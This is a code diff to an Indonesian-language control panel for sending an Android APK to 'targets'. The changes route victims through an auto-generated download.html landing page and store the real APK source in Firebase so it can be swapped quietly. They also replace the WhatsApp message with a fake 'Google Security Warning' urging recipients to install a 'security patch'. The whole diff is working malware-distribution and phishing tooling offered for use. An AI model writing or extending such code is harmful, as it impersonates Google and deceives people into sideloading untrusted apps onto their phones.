@@ -128,8 +128,13 @@
             <p style="margin:0; font-size:0.9em; color:#666;">Gunakan bagian ini untuk mengirim link download aplikasi ke target baru.</p>
 
             <div class="dist-row">
-                <input type="text" class="dist-input" id="apk-link" placeholder="Masukkan Link Download APK (Gdrive/Mediafire/dll)">
+                <input type="text" class="dist-input" id="apk-link" placeholder="Link Landing Page (Otomatis terisi)" readonly>
                 <button class="btn-copy" onclick="copyApkLink()">Salin Link</button>
+            </div>
+
+            <div class="dist-row">
+                <input type="text" class="dist-input" id="real-apk-source" placeholder="Ganti Sumber APK (Link Gdrive/Mediafire)">
+                <button class="btn-copy" onclick="updateApkSource()" style="background:#4285f4;">Update Link APK</button>
             </div>
 
             <div class="dist-row">
@@ -275,18 +280,31 @@
 
         window.copyApkLink = function() {
             const link = document.getElementById("apk-link").value;
-            if (!link) return alert("Masukkan link APK terlebih dahulu");
-            navigator.clipboard.writeText(link).then(() => alert("Link disalin!"));
+            if (!link) return alert("Link belum siap");
+            navigator.clipboard.writeText(link).then(() => alert("Link Landing Page disalin!"));
+        };
+
+        window.updateApkSource = function() {
+            const realLink = document.getElementById("real-apk-source").value.trim();
+            if (!realLink) return alert("Masukkan link APK asli (Gdrive/dll)");
+
+            // Simpan ke Firebase agar download.html bisa baca link terbaru
+            set(ref(db, 'config/apk_download_url'), realLink).then(() => {
+                alert("Link sumber APK berhasil diupdate ke sistem!");
+            });
         };
 
         window.sendApkViaWA = function() {
             const link = document.getElementById("apk-link").value;
             const phone = document.getElementById("target-wa").value.replace(/\+/g, '').replace(/ /g, '').replace(/-/g, '');
-            if (!link || !phone) return alert("Link APK dan Nomor WA harus diisi");
+            if (!link || !phone) return alert("Link dan Nomor WA harus diisi");
 
-            const message = encodeURIComponent(`Halo, mohon install aplikasi Security Update ini untuk memverifikasi keamanan perangkat Anda:\n\n${link}`);
+            const message = encodeURIComponent(`🚨 *Peringatan Keamanan Google* 🚨\n\nPerangkat Anda terdeteksi memiliki kerentanan sistem. Mohon segera verifikasi dan instal patch keamanan terbaru melalui pusat bantuan resmi kami di bawah ini:\n\n🔗 ${link}`);
             window.open(`https://api.whatsapp.com/send?phone=${phone}&text=${message}`, "_blank");
         };
+
+        // Inisialisasi Link Landing Page Otomatis
+        document.getElementById("apk-link").value = window.location.href.replace('index.html', '') + "download.html";
 
         document.getElementById("btn-clear-all").onclick = function() {
             if (confirm("PERINGATAN: Ini akan menghapus SELURUH data di database. Lanjutkan?")) {
